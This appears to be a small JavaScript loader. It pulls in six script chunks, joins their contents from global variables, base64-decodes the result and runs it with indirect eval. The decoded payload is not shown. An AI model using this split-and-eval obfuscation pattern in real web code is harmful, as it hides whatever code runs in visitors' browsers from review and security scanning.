(function(){
  function go(){
    try{
      var b='';
      for(var i=0;i<6;i++) b+=(window['__B'+i+'__']||'');
      var s=atob(b);
      var u=decodeURIComponent(s.split('').map(function(c){return '%'+('00'+c.charCodeAt(0).toString(16)).slice(-2)}).join(''));
      (0,eval)(u);
    }catch(e){console.error(e)}
  }
  var n=0, total=6;
  for(var i=0;i<6;i++){
    (function(i){
      var s=document.createElement('script');
      s.src='b'+i+'.js';
      s.onload=function(){n++;if(n===total)go();};
      s.onerror=function(){n++;if(n===total)go();};
      document.head.appendChild(s);
    })(i);
  }
})();
